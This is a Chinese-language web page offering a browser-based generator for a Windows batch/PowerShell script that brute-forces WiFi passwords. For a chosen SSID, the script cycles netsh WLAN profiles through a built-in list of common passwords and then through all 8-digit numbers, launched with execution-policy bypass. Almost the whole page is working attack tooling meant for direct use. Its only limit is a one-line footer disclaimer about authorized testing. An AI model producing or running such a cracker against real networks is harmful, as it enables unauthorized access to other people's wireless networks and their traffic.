<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>WiFi 密码破解</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        textarea { resize: vertical; }
    </style>
</head>
<body class="bg-gray-950 min-h-screen text-gray-100 font-sans antialiased">

    <main class="max-w-lg mx-auto px-4 py-6 sm:py-10">

        <!-- 标题 -->
        <header class="text-center mb-6">
            <div class="inline-flex items-center justify-center w-14 h-14 bg-blue-600 rounded-2xl mb-3">
                <svg class="w-7 h-7 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                          d="M8.111 16.404a5.5 5.5 0 017.778 0M12 20h.01m-7.08-7.071c3.904-3.905 10.236-3.905 14.141 0M1.394 9.393c5.857-5.858 15.355-5.858 21.213 0"/>
                </svg>
            </div>
            <h1 class="text-xl font-bold tracking-tight">WiFi 密码破解工具</h1>
            <p class="text-gray-500 text-sm mt-1">纯离线 · 下载脚本双击运行 · 无需安装任何东西</p>
        </header>

        <!-- 输入区 -->
        <section class="bg-gray-900 rounded-2xl p-5 mb-4 border border-gray-800">
            <label class="block text-sm font-medium text-gray-400 mb-2" for="ssid">
                目标 WiFi 名称 (SSID)
            </label>
            <input id="ssid" type="text" placeholder="例如: 2lou" value="2lou" autocomplete="off"
                class="w-full bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-gray-100
                       placeholder-gray-600 focus:outline-none focus:ring-2 focus:ring-blue-500
                       focus:border-transparent transition text-base" />
        </section>

        <!-- 字典编辑区 -->
        <section class="bg-gray-900 rounded-2xl p-5 mb-4 border border-gray-800">
            <div class="flex items-center justify-between mb-2">
                <label class="text-sm font-medium text-gray-400" for="wordlist">
                    密码字典
                </label>
                <span class="text-xs text-gray-600">每行一个密码</span>
            </div>
            <textarea id="wordlist" rows="10"
                class="w-full bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-sm text-gray-100
                       placeholder-gray-600 focus:outline-none focus:ring-2 focus:ring-blue-500
                       focus:border-transparent transition font-mono"
                placeholder="每行一个密码..."></textarea>
            <div class="flex items-center justify-between mt-2">
                <span id="wordlist-count" class="text-xs text-gray-500"></span>
                <button id="btn-reset" class="text-xs text-blue-500 hover:text-blue-400 transition">
                    恢复默认字典
                </button>
            </div>
        </section>

        <!-- 说明 -->
        <section class="bg-blue-900/20 border border-blue-800 rounded-2xl p-4 mb-4">
            <p class="text-blue-300 text-xs leading-relaxed">
                <span class="font-medium">💡 使用方式</span><br>
                填写 SSID → 点击<strong>下载</strong> → 得到 <code>.bat</code> 文件<br>
                在 Windows 电脑上<strong>双击运行</strong>（会自动调用 PowerShell）<br>
                顺序：先试常见密码 → 再试全部8位数字（00000000~99999999）→ 全部失败则显示"已尽力了"
            </p>
        </section>

        <!-- 按钮 -->
        <section class="flex gap-3 mb-4">
            <button id="btn-download"
                class="flex-1 bg-blue-600 hover:bg-blue-500 active:bg-blue-700
                       text-white font-medium py-3.5 px-4 rounded-xl transition-colors
                       disabled:opacity-40 disabled:cursor-not-allowed text-base">
                ⬇ 下载破解脚本
            </button>
        </section>

        <p id="estimate" class="text-center text-xs text-gray-600"></p>

        <footer class="text-center text-xs text-gray-700 mt-6 leading-relaxed px-2">
            ⚠️ 本工具仅供安全研究和授权测试使用<br>
            请勿用于非法破解他人 WiFi 网络
        </footer>
    </main>

    <script>
        // ─── 常见密码（按概率排序） ──────────────────────────
        const COMMON = [
            "12345678", "88888888", "00000000", "11111111", "22222222",
            "33333333", "44444444", "55555555", "66666666", "77777777",
            "99999999", "123456789", "1234567890", "87654321", "11223344",
            "12341234", "12344321", "12121212", "13131313", "01010101",
            "10101010", "123123123", "111222333",
            "password", "password1", "password123",
            "admin123", "admin888", "admin666", "admin168",
            "qwertyuiop", "qwerty123", "qweasdzxc", "asdfghjkl",
            "abc12345", "abcd1234", "a1234567", "a12345678",
            "Aa123456", "@1234567", "1q2w3e4r", "1q2w3e4r5t",
            "iloveyou", "welcome1", "hello123", "trustno1",
            "mima123456", "mima8888", "wifi1234", "wifi8888",
            "wifi6666", "wifi9999", "123456wifi",
            "luyou8888", "zhongguo123", "xiao123456", "woaini1314",
            "admin", "tplink", "tplink123", "root123", "guest123",
            "20202020", "20212021", "20222022", "20232023", "20242024",
            "20252025", "20080808", "20101010", "5201314", "1314520",
            "2lou1234", "2lou8888", "2lou2024", "2lou2025", "2lou2026",
            "2lou888", "2lou666", "2lou168", "2lou520",
            "lou12345", "erluo888", "erluo123", "erlou888",
            "2lou2lou", "lou123456",
            "88886666", "16888888", "66668888", "66888888",
            "14725836", "25836914", "15935746",
            "12369874", "14789632", "15975328",
            "11112222", "22221111", "11221122",
            "00001111", "11110000",
            "168168", "518518", "666888", "888666", "520520",
            "13800138000", "13900139000", "13700137000",
            "13600136000", "13500135000", "15800158000",
            "18888888888", "16666666666", "19999999999",
            "13333333333", "15555555555", "17777777777",
        ];

        const $ = s => document.querySelector(s);
        const ssidInput  = $("#ssid");
        const wordlistEl = $("#wordlist");
        const countEl    = $("#wordlist-count");
        const btnReset   = $("#btn-reset");
        const btnDownload = $("#btn-download");
        const estimateEl = $("#estimate");

        function loadDefault() {
            wordlistEl.value = COMMON.join("\n");
            updateCount();
        }
        function updateCount() {
            const lines = wordlistEl.value.split("\n").filter(l => l.trim());
            const n = lines.length;
            const phase2 = 100000000;
            const minTotal = (n + phase2) * 5;
            const minH = Math.floor(minTotal / 3600);
            const minD = Math.floor(minH / 24);
            countEl.textContent = `阶段1: ${n} 条常见密码 → 阶段2: ${phase2.toLocaleString()} 条全8位数字`;
            const phase1Min = Math.ceil(n * 5 / 60);
            if (minD > 0) {
                estimateEl.textContent = `阶段1 约需 ${phase1Min} 分钟 | 全部跑完约需 ${minD.toLocaleString()} 天（8位数字全组合共1亿条）`;
            } else {
                estimateEl.textContent = `阶段1 约需 ${phase1Min} 分钟 | 阶段2 全8位数字约需 ${Math.ceil(minH)} 小时`;
            }
        }
        btnReset.addEventListener("click", loadDefault);
        wordlistEl.addEventListener("input", updateCount);

        // ─── 生成脚本 ────────────────────────────────────────
        function build(ssid, phase1Passwords) {
            // 阶段1密码（去重、>=8位）
            const p1 = [...new Set(phase1Passwords.map(p => p.trim()).filter(p => p.length >= 8))];

            // ── PowerShell 破解引擎 ──
            const psScript = `#Requires -Version 5.1
<#
.WiFi 密码破解脚本
 阶段1: 常见密码
 阶段2: 全部8位数字组合 (00000000 ~ 99999999)
#>

param([string]$ssid = '__SSID__')

$ErrorActionPreference = 'SilentlyContinue'
$host.UI.RawUI.WindowTitle = "WiFi Crack - $ssid"

# ── 阶段1密码（由网页生成时嵌入） ──
$phase1 = @(
${p1.map(p => `    '${p.replace(/'/g, "''")}'`).join(",\n")}
)

# ── 辅助函数 ──
function Test-Connection {
    param($targetSSID)
    $out = netsh wlan show interfaces 2>$null
    $lines = $out -split "\`n"
    foreach ($line in $lines) {
        if ($line -match 'SSID\\s*:\\s*(.+)$') {
            if ($Matches[1].Trim() -eq $targetSSID) { return $true }
        }
    }
    return $false
}

function Try-Password {
    param($targetSSID, $password)
    netsh wlan delete profile name="$targetSSID" 2>$null | Out-Null

    $xml = @"
<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>$targetSSID</name>
    <SSIDConfig><SSID><name>$targetSSID</name></SSID></SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>manual</connectionMode>
    <MSM><security><authEncryption>
        <authentication>WPA2PSK</authentication>
        <encryption>AES</encryption>
        <useOneX>false</useOneX>
    </authEncryption>
    <sharedKey><keyType>passPhrase</keyType>
        <protected>false</protected>
        <keyMaterial>$password</keyMaterial>
    </sharedKey></security></MSM>
</WLANProfile>
"@
    $xmlPath = Join-Path $env:TEMP "wifi_crack_temp.xml"
    $xml | Out-File -FilePath $xmlPath -Encoding UTF8 -Force
    netsh wlan add profile filename="$xmlPath" 2>$null | Out-Null
    Remove-Item $xmlPath -Force -ErrorAction SilentlyContinue
    Start-Sleep -Milliseconds 500
    netsh wlan connect name="$targetSSID" 2>$null | Out-Null
    Start-Sleep -Seconds 4
    return (Test-Connection $targetSSID)
}

# ── 主流程 ──
Write-Host ""
Write-Host "============================================" -ForegroundColor Cyan
Write-Host "  WiFi 密码破解脚本" -ForegroundColor Cyan
Write-Host "  目标: $ssid" -ForegroundColor Cyan
Write-Host "  阶段1: $($phase1.Count) 条常见密码" -ForegroundColor Cyan
Write-Host "  阶段2: 全部8位数字 (00000000~99999999)" -ForegroundColor Cyan
Write-Host "============================================" -ForegroundColor Cyan
Write-Host ""

# 断开当前连接
Write-Host "[*] 断开当前 WiFi..." -ForegroundColor Gray
netsh wlan disconnect 2>$null | Out-Null
Start-Sleep -Seconds 2

$found = $false
$sw = [System.Diagnostics.Stopwatch]::StartNew()

# ═══════════════════════════════════════════════
#  阶段1: 常见密码
# ═══════════════════════════════════════════════
Write-Host "=== 阶段1: 常见密码 ($($phase1.Count) 条) ==="
Write-Host ""

for ($i = 0; $i -lt $phase1.Count; $i++) {
    $pwd = $phase1[$i]
    $n = $i + 1
    Write-Host ("[$n/$($phase1.Count)] 尝试: $pwd") -ForegroundColor Yellow
    if (Try-Password $ssid $pwd) {
        Write-Host ""
        Write-Host "╔══════════════════════════════════════════╗" -ForegroundColor Green
        Write-Host "║  PASSWORD FOUND !!!                      ║" -ForegroundColor Green
        Write-Host ("║  SSID     : $ssid") -ForegroundColor Green
        Write-Host ("║  Password : $pwd") -ForegroundColor Green
        Write-Host "╚══════════════════════════════════════════╝" -ForegroundColor Green
        Write-Host ""
        $sw.Stop()
        $min = [math]::Round($sw.Elapsed.TotalMinutes, 1)
        Write-Host ("耗时: $min 分钟") -ForegroundColor Gray
        Read-Host "按 Enter 退出"
        exit 0
    }
}

Write-Host ""
Write-Host "[阶段1 完成] $($phase1.Count) 条常见密码均未成功" -ForegroundColor Gray
$min1 = [math]::Round($sw.Elapsed.TotalMinutes, 1)
Write-Host ("阶段1耗时: $min1 分钟") -ForegroundColor Gray
Write-Host ""

# 构建阶段1的8位数字跳过集合
$skipSet = New-Object 'System.Collections.Generic.HashSet[string]'
foreach ($p in $phase1) { if ($p -match '^\\d{8}$') { [void]$skipSet.Add($p) } }

# ═══════════════════════════════════════════════
#  阶段2: 全部8位数字组合 (00000000 ~ 99999999)
# ═══════════════════════════════════════════════
Write-Host "=== 阶段2: 全部8位数字组合 (00000000~99999999) ==="
Write-Host ""

$total = 100000000
$lastReport = 0

for ($i = 0; $i -le 99999999; $i++) {
    $pwd = $i.ToString("00000000")

    # 跳过阶段1已尝试的8位数字
    if ($skipSet.Contains($pwd)) { continue }

    # 每10000条报告进度
    if ($i - $lastReport -ge 10000) {
        $pct = [math]::Round($i / 99999999 * 100, 4)
        $elapsed = [math]::Round($sw.Elapsed.TotalMinutes, 1)
        $rate = if ($elapsed -gt 0) { [math]::Round(($i + 1) / ($elapsed * 60), 0) } else { 0 }
        Write-Host ("[阶段2] $i / 100000000 ($pct%)  ~$rate pwd/s  当前: $pwd") -ForegroundColor DarkYellow
        $lastReport = $i
    }

    if (Try-Password $ssid $pwd) {
        Write-Host ""
        Write-Host "╔══════════════════════════════════════════╗" -ForegroundColor Green
        Write-Host "║  PASSWORD FOUND !!!                      ║" -ForegroundColor Green
        Write-Host ("║  SSID     : $ssid") -ForegroundColor Green
        Write-Host ("║  Password : $pwd") -ForegroundColor Green
        Write-Host "╚══════════════════════════════════════════╝" -ForegroundColor Green
        Write-Host ""
        $sw.Stop()
        $totalMin = [math]::Round($sw.Elapsed.TotalMinutes, 1)
        Write-Host ("总耗时: $totalMin 分钟") -ForegroundColor Gray
        Read-Host "按 Enter 退出"
        exit 0
    }
}

# ── 全部失败 ──
$sw.Stop()
$totalMin = [math]::Round($sw.Elapsed.TotalMinutes, 1)
Write-Host ""
Write-Host "╔══════════════════════════════════════════╗" -ForegroundColor Red
Write-Host "║  DONE - NO PASSWORD FOUND               ║" -ForegroundColor Red
Write-Host "║  已尽力了，未找到匹配的密码               ║" -ForegroundColor Red
Write-Host ("║  阶段1: $($phase1.Count) 条 + 阶段2: 全部8位数字") -ForegroundColor Red
Write-Host ("║  总耗时: $totalMin 分钟") -ForegroundColor Red
Write-Host "╚══════════════════════════════════════════╝" -ForegroundColor Red
Write-Host ""
Read-Host "按 Enter 退出"
exit 1
`;

            // ── .bat 启动器 ──
            // 巧妙设计：.bat 前半部分是用 exit /b 结束的批处理启动代码
            // exit /b 之后的所有内容就是纯 PowerShell 脚本
            // PowerShell 通过 Get-Content 读取自身 .bat 文件，用正则切出 PS 部分执行
            // 彻底避免了转义地狱、base64 编解码、命令行长度限制
            const bat = `@echo off
chcp 65001 >nul 2>&1
title WiFi Crack - ${ssid.replace(/[&|<>^%!"]/g, "")}
set "PS=%TEMP%\\wc.ps1"
powershell -NoProfile -ExecutionPolicy Bypass -Command "(Get-Content '%~f0' -Raw) -replace '(?s)^.*?exit /b\\s*','' -replace '__SSID__','${ssid.replace(/'/g, "''")}' | Out-File '%PS%' -Encoding UTF8; & '%PS%'; Remove-Item '%PS%'"
pause
exit /b

${psScript}
`;

            return bat;
        }

        function escapeBat(s) { return s.replace(/[&|<>^%!"]/g, ""); }
        function escapePS(s) { return s.replace(/'/g, "''").replace(/`/g, "'`'"); }

        // ─── 下载 ────────────────────────────────────────────
        btnDownload.addEventListener("click", () => {
            const ssid = ssidInput.value.trim();
            if (!ssid) { alert("请输入 WiFi 名称"); return; }
            const passwords = wordlistEl.value.split("\n").filter(l => l.trim());
            if (!passwords.length) { alert("请填写至少一个密码"); return; }

            const batContent = build(ssid, passwords);
            const blob = new Blob([batContent], { type: "application/octet-stream" });
            const url = URL.createObjectURL(blob);
            const a = document.createElement("a");
            a.href = url;
            a.download = `crack_${ssid}.bat`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
        });

        loadDefault();
    </script>
</body>
</html>
